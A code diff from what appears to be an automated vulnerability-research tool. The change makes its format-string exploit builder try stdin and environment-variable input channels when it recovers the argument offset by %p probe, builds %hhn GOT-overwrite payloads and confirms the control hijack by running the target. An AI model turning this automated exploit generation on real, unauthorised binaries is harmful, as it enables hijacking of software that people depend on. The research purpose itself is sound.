@@ -458,15 +458,16 @@ def _fmt_repro(target, layout: dict, plan: dict, win) -> str:
             f"{winname}\n")
 
 
-def _construct_by_probe(ctx, target, ir, lead, fname: str, win, target_bytes: bytes):
+def _construct_by_probe(ctx, target, ir, lead, fname: str, win, target_bytes: bytes, specs=None):
     """doc 58 fallback: when the static frame recovery cannot place the format buffer (e.g. the
     decompiler symbolized the stack local, so the numeric offset is hidden) BUT the target can run
     here, recover the arg offset with the %p probe, then CONFIRM a GOT-overwrite-to-win by
-    detonation. Returns a dict {payload, slot, got, off, win} on a confirmed hijack, else None.
-    x86-64 / no-PIE only; detonation makes it poc-backed, not merely constructed."""
+    detonation. `specs` is the ranked (mode, env_name) input channels to try -- the format string
+    is not always read from stdin. Returns a dict {payload, slot, got, off, win, mode, env_name} on
+    a confirmed hijack, else None. x86-64 / no-PIE only; detonation makes it poc-backed."""
     if not (win and win[1]):
         return None
-    from . import detonate, elfstatic, rop
+    from . import channels as _channels, detonate, elfstatic, rop
     try:
         if elfstatic.is_pie(target_bytes):
             return None
@@ -476,11 +477,22 @@ def _construct_by_probe(ctx, target, ir, lead, fname: str, win, target_bytes: by
         ctx.content.stage_target(target, staged.parent, staged.name)
         staged.chmod(0o755)
         exe = str(staged)
+        scratch_dir = str(staged.parent)
     except Exception:                                    # noqa: BLE001
         return None
-    off = detonate.probe_fmt_offset(exe)                 # None if the target cannot run here
-    if off is None:
+    specs = specs or [("stdin", None)]
+    # Recover the arg offset on whichever channel actually carries the format string: %p must print
+    # our 0x41.. marker, which only happens when the buffer is read from the channel we deliver on.
+    chan = None
+    for mode, env_name in specs:
+        off = detonate.probe_fmt_offset(exe, input_mode=mode, env_name=env_name,
+                                        scratch_dir=scratch_dir)
+        if off is not None:
+            chan = (mode, env_name, off)
+            break
+    if chan is None:
         return None
+    mode, env_name, off = chan
     try:
         got = rop.got_entries(target_bytes)
     except Exception:                                    # noqa: BLE001
@@ -503,38 +515,43 @@ def _construct_by_probe(ctx, target, ir, lead, fname: str, win, target_bytes: by
             payload = fmt.fmtstr_payload(off, {got[slot]: win_vaddr}, nbytes=6)
         except Exception:                                # noqa: BLE001
             continue
-        if detonate.reaches_address(exe, payload, win_vaddr, input_mode="stdin"):
-            return {"payload": payload, "slot": slot, "got": got[slot], "off": off, "win": win}
+        if detonate.reaches_address(exe, payload, win_vaddr, input_mode=mode, env_name=env_name,
+                                    scratch_dir=scratch_dir):
+            return {"payload": payload, "slot": slot, "got": got[slot], "off": off, "win": win,
+                    "mode": mode, "env_name": env_name}
     return None
 
 
-def _try_detonate(ctx, target, plan: dict, win):
+def _try_detonate(ctx, target, plan: dict, win, specs=None):
     """Best-effort bonus confirmation: if the target can run here, verify control reaches the win
-    address when the payload is delivered -> (True, signal). Never required; a sound construction
-    stands on its argument alone. Returns (False, None) when the target cannot run or the oracle
-    is unavailable -- the reached-address oracle is wired in the next step."""
+    address when the payload is delivered on one of `specs` (the ranked input channels) ->
+    (True, signal, mode, env_name). Never required; a sound construction stands on its argument
+    alone. Returns (False, None, None, None) when the target cannot run or no channel reaches."""
     try:
         from . import detonate
     except Exception:                                    # noqa: BLE001
-        return (False, None)
+        return (False, None, None, None)
     try:
         win_vaddr = int(win[1]) if win and win[1] else None
         if win_vaddr is None or not plan.get("input"):
-            return (False, None)
+            return (False, None, None, None)
         from . import elfstatic
         tb = ctx.content.path(target.sha256).read_bytes()
         if elfstatic.is_pie(tb):                          # win_vaddr is a file vaddr; PIE needs a base
-            return (False, None)
+            return (False, None, None, None)
         # stage into an EXEC-capable dir -- the content store keeps artifacts non-exec
         staged = ctx.scratch() / "fmt-construct" / (getattr(target, "filename", None) or "target.bin")
         staged.parent.mkdir(parents=True, exist_ok=True)
         ctx.content.stage_target(target, staged.parent, staged.name)
         staged.chmod(0o755)
-        if detonate.reaches_address(str(staged), bytes(plan["input"]), win_vaddr, input_mode="stdin"):
-            return (True, f"control reached {win[0]} ({win_vaddr:#x})")
+        scratch_dir = str(staged.parent)
+        for mode, env_name in (specs or [("stdin", None)]):
+            if detonate.reaches_address(str(staged), bytes(plan["input"]), win_vaddr,
+                                        input_mode=mode, env_name=env_name, scratch_dir=scratch_dir):
+                return (True, f"control reached {win[0]} ({win_vaddr:#x})", mode, env_name)
     except Exception:                                    # noqa: BLE001
         observe.absorbed(_log, "fmt detonation skipped")
-    return (False, None)
+    return (False, None, None, None)
 
 
 def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[bytes] = None,
@@ -543,7 +560,7 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
     corroborated recipe carrying the payload bytes. Returns the filed finding ids ([] when there is
     no CWE-134 lead, the target is not x86-64, or a format exploit is already demonstrated).
     Never raises."""
-    from . import construct, exploit, recipe
+    from . import channels, construct, exploit, recipe
     fids = []
     try:
         if not _x86_64(target) or _already_exploited(ctx.conn, target):
@@ -558,6 +575,8 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
             edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
         except Exception:                                # noqa: BLE001
             edges = None
+        # input channels the format string may be read from, highest-signal first (not just stdin).
+        specs = channels.delivery_specs(ctx, target)
         win = exploit.find_win(exploit.elf_functions(target_bytes), call_edges=edges)
         win = win if win and win[0] else None
         done = 0
@@ -585,13 +604,17 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
             # doc 58: if the static construction isn't a complete one-shot but the target RUNS,
             # recover the offset by probe and CONFIRM a GOT-overwrite-to-win by detonation.
             if not (plan and plan.get("stage") == "one-shot"):
-                dyn = _construct_by_probe(ctx, target, ir, lead, name, win, target_bytes)
+                dyn = _construct_by_probe(ctx, target, ir, lead, name, win, target_bytes, specs)
                 if dyn:
                     done += 1
                     try:
                         s = f"{int(str(lead.site_addr), 0):#x}"
                     except (ValueError, TypeError):
                         s = str(lead.site_addr)
+                    _mode, _env = dyn.get("mode", "stdin"), dyn.get("env_name")
+                    _binname = getattr(target, 'filename', None) or './target'
+                    _where = channels.channel_phrase(_mode, _env)
+                    _deliver = channels.deliver_line(_mode, _binname, _env)
                     fid = construct.record_constructed_poc(
                         ctx, target, cwe="CWE-134",
                         technique=f"format-string %hhn GOT overwrite ({dyn['slot']}@GOT := {win[0]})",
@@ -599,6 +622,7 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
                         soundness=[
                             f"{name}(buf) at {s}: a run-time buffer is the format with zero format "
                             "arguments (the CWE-134 shape)",
+                            f"the format string is read from {_where}",
                             f"arg offset {dyn['off']} recovered by %p probe (the 0x41.. marker "
                             f"printed at that varargs position)",
                             f"no PIE: {dyn['slot']}@GOT is at the fixed address {dyn['got']:#x}",
@@ -609,10 +633,10 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
                         reproduce=(f"# CWE-134 format-string GOT overwrite -> {win[0]} (L3)\n"
                                    f"# {dyn['slot']}@GOT({dyn['got']:#x}) := &{win[0]}"
                                    f"({int(win[1]):#x}) via %hhn at arg offset {dyn['off']}.\n"
-                                   f"# payload is the attached poc-input artifact ({len(dyn['payload'])} "
-                                   f"bytes); save as poc.bin\n"
-                                   f"{getattr(target,'filename',None) or './target'} < poc.bin"),
-                        input_mode="stdin", detector="fmt_construct",
+                                   f"# payload (read from {_where}) is the attached poc-input artifact "
+                                   f"({len(dyn['payload'])} bytes); save as poc.bin\n"
+                                   f"{_deliver}"),
+                        input_mode=_mode, detector="fmt_construct",
                         dedup_key=f"poc:CWE-134:fmt-write:{s}:{target.id}",
                         title=f"Format-string write-what-where at {s}",
                         summary=f"{name}(buf) at {s}: %hhn-write &{win[0]} over {dyn['slot']}@GOT "
@@ -639,7 +663,10 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
             # branches rest on an unproven fact (an offset to probe, a base to leak) and stay
             # honest corroborated recipes below.
             if plan.get("stage") == "one-shot" and plan.get("input"):
-                detonated, signal_name = _try_detonate(ctx, target, plan, win)
+                detonated, signal_name, det_mode, det_env = _try_detonate(ctx, target, plan, win, specs)
+                # record the channel detonation actually used; else keep stdin (the static plan's
+                # documented default -- without a run we cannot know which channel is read).
+                one_mode = det_mode if detonated else "stdin"
                 w_addr, w_val = next(iter((plan.get("writes") or {}).items()), (None, None))
                 custom = (_fmt_customize(target, target_bytes, arg_offset=layout.get("arg_offset"),
                           slot_name=_got_name(target_bytes, w_addr), slot_addr=w_addr, value=w_val,
@@ -650,7 +677,7 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
                     level=plan["target_level"], payload=plan["input"],
                     soundness=list(plan["assumptions"]),
                     reproduce=_fmt_repro(target, layout, plan, win),
-                    input_mode="stdin", detector="fmt_construct",
+                    input_mode=one_mode, detector="fmt_construct",
                     dedup_key=f"poc:CWE-134:fmt-write:{site}:{target.id}",
                     title=f"Format-string write-what-where at {site}",
                     summary=plan["summary"], lead=lead, extra_evidence=custom,
